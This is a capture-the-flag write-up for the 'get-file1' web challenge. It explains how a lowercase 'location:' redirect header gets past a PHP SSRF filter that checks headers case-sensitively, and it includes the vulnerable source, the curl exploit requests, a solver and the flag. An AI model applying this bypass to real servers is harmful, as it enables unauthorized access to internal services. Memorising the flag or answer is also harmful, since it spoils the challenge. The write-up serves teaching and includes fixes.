# get-file1

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Web |
| Points | 100 |
| Author | 夜有夢 |
| Connection | `http://chal.thjcc.org:8081/` |
| Handout | [`artifacts/`](artifacts/) (full docker-compose source) |
| Interactive writeup | [Location vs location — request trace](https://claude.ai/code/artifact/51a30604-c22c-4df9-93dc-1ed11c2f3b5e) |
| Flag | `THJCC{pHp_StReAm_30X_cAsE_43082ed528}` |

## TL;DR

An SSRF fetcher (`file.php`) blocks the internal flag host `flag.thjcc`, which is
only reachable via a redirect. The app parses redirect targets with a
**case-sensitive** `str_starts_with($v, 'Location:')` and re-applies its host
filter to them — but when it finds *no* `Location:` header it falls through to a
second fetch with `follow_location=true`, and **PHP matches the `Location`
header case-insensitively**. A redirector that answers with a lowercase
`location:` header therefore slips past the app's parser yet is still followed
by PHP straight to `http://flag.thjcc/flag.txt`. The whole exploit is one
request:

```
GET /file.php?u=http://r/a
```

## 1. The Architecture

`docker-compose.yml` wires three containers across a **public** and an
**internal** network:

```yaml
services:
  w: { build: ., ports: ["8081:80"], networks: [public, n] }   # PHP app (SSRF)
  r: { build: ./redirector, networks: [n] }                     # redirector
  f: { build: ./flag, networks: { n: { aliases: [flag.thjcc] } } }  # flag svc
networks:
  public: {}
  n: { internal: true }
```

Only `w` is exposed (`:8081`). It sits on the internal network `n` too, so its
outbound requests can reach `r` and `f`. `f` is published on `n` under the DNS
alias **`flag.thjcc`**.

### The flag service (`f`) — two guards

```python
# flag/server.py
if self.headers.get('Host','').split(':')[0].lower() != 'flag.thjcc':
    self.send_response(403); ...; return
if self.path != '/flag.txt':
    self.send_response(404); ...; return
self.send_response(200); ...; self.wfile.write(FLAG)
```

The flag is returned **only** when the request has `Host: flag.thjcc` *and* path
`/flag.txt`. This is the crux: reaching the container by IP or by its Docker
service name `f` yields `403`, because the `Host` header would then be `f`/an
IP, not `flag.thjcc`. **PHP only emits `Host: flag.thjcc` if the URL host is
literally `flag.thjcc`** — which is exactly what the app's filter blocks.

## 2. The Vulnerable Fetcher

`src/file.php` (reformatted):

```php
function a($s){                                   // the URL allow-check
  $p = parse_url($s);
  return $p && isset($p['scheme'], $p['host'])
      && in_array(strtolower($p['scheme']), ['http','https'], true)
      && strtolower(rtrim($p['host'], '.')) !== 'flag.thjcc';   // block flag host
}

function b($s){
  for ($i = 0; $i < 5; $i++){
    if (!a($s)) throw new Exception();

    // (1) fetch WITHOUT following redirects, inspect the headers
    $c = stream_context_create(['http'=>['follow_location'=>false,'timeout'=>3,'ignore_errors'=>true]]);
    $x = @file_get_contents($s, false, $c);
    $h = $http_response_header ?? [];

    // (2) hand-rolled redirect detection -- CASE-SENSITIVE
    $n = null;
    foreach ($h as $v)
      if (str_starts_with($v, 'Location:'))
        $n = trim(substr($v, strpos($v, ':') + 1));

    if ($n !== null){                 // a redirect was seen -> re-check + loop
      if (!a($n)) throw new Exception();
      $s = $n; continue;
    }
    if ($x === false) throw new Exception();

    // (3) NO redirect header seen -> fetch again, this time FOLLOWING redirects
    $d = stream_context_create(['http'=>['follow_location'=>true,'timeout'=>3,'ignore_errors'=>true]]);
    $y = @file_get_contents($s, false, $d);
    if ($y === false) throw new Exception();
    return $y;
  }
  throw new Exception();
}
```

The developer clearly *tried* to stop redirect-based SSRF: fetch once without
following, look for a `Location`, and re-run the host filter on it. The mistake
is the **inconsistency** between how the app looks for the redirect and how PHP
does when it actually follows one.

## 3. The Redirector Hands Us Both Cases

`redirector/server.py` exposes two endpoints that differ *only* in the letter
case of the header name:

```python
if self.path == '/a':
    self.send_response(302); self.send_header('location', 'http://flag.thjcc/flag.txt'); ...  # lowercase
elif self.path == '/b':
    self.send_response(302); self.send_header('Location', 'http://flag.thjcc/flag.txt'); ...  # Capital
```

This is the whole puzzle spelled out: which casing does the app miss but PHP
still obeys?

## 4. Why `/b` Fails and `/a` Wins

**`u=http://r/b`** — capital `Location:`:

1. `a('http://r/b')` → host `r` ≠ `flag.thjcc` → allowed.
2. First fetch (no follow) → header `Location: http://flag.thjcc/flag.txt`.
3. `str_starts_with('Location: …', 'Location:')` → **matches** → `$n = http://flag.thjcc/flag.txt`.
4. `a($n)` → host `flag.thjcc` → **false** → `throw`. → `error`.

**`u=http://r/a`** — lowercase `location:`:

1. `a('http://r/a')` → host `r` → allowed.
2. First fetch (no follow) → header `location: http://flag.thjcc/flag.txt`.
3. `str_starts_with('location: …', 'Location:')` → **does not match** (case-sensitive) → `$n` stays `null`.
4. `$x` is the 302's body (`""`, not `false`) → passes the `=== false` check.
5. Fallback fetch with `follow_location=true` on `http://r/a`:
   PHP's HTTP stream wrapper detects the redirect **case-insensitively**
   (`strncasecmp(..., "Location:", 9)`), follows it to
   `http://flag.thjcc/flag.txt`, and — because it is now requesting that literal
   host — sends `Host: flag.thjcc`.
6. The flag service sees `Host: flag.thjcc` + `/flag.txt` → **200 + flag**.

```bash
$ curl -s 'http://chal.thjcc.org:8081/file.php' --data-urlencode 'u=http://r/b' -G
error
$ curl -s 'http://chal.thjcc.org:8081/file.php' --data-urlencode 'u=http://r/a' -G
THJCC{pHp_StReAm_30X_cAsE_43082ed528}
```

## 5. Solver

[`solve.py`](solve.py) is standard-library only and issues the single request:

```bash
python3 solve.py                       # defaults to the challenge URL
```

```
[*] u=http://r/b  (capital Location, the trap): [HTTP 400] error
[*] u=http://r/a  (lowercase location, the bypass): THJCC{pHp_StReAm_30X_cAsE_43082ed528}

[+] flag: THJCC{pHp_StReAm_30X_cAsE_43082ed528}
```

## Why It Works

- **Two parsers, one field.** The app and the runtime both interpret the
  `Location` header, but with different case rules. Any security check that
  re-implements parsing the runtime will also perform must match the runtime
  *exactly*; here the app is stricter (case-sensitive) than PHP, so a header the
  app ignores is still honoured downstream. The flag name says it: *php stream
  30x case*.
- **The filter guards the wrong step.** Validation happens on the header the app
  parses, but the dangerous fetch is a *separate* call (`follow_location=true`)
  that re-parses the response itself. A check that isn't on the same code path
  as the action it guards can always be desynchronised.
- **Host-bound secret forces a redirect.** Because the flag service pins on
  `Host: flag.thjcc`, IP/service-name tricks don't help — you *must* make PHP
  request that literal host, which is only possible by having PHP follow a
  redirect the app couldn't veto.

## The Fix

- **Don't hand-roll redirect handling next to PHP's.** Either fully disable
  redirects and reject any 3xx, or resolve the final URL with the *same* logic
  the fetch will use — case-insensitive header matching — and validate that.
- **Validate the connection, not the string.** Re-resolve the host and check the
  target IP against a deny-list right before connecting (and pin it), rather than
  filtering on a hostname substring.
- **Never let the requested `Host` be attacker-influenced into an internal
  trust decision.** The flag service trusting `Host: flag.thjcc` is the same
  anti-pattern one level down.

## Flag

```text
THJCC{pHp_StReAm_30X_cAsE_43082ed528}
```
